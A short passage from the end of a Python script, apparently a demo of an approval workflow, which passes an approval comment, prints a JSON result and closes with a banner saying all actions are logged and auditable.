            approval_comments="Need more information before proceeding"
        )
        print(json.dumps(result, indent=2))
    
    print("\n" + "="*60)
    print("All actions logged and auditable")
    print("="*60)
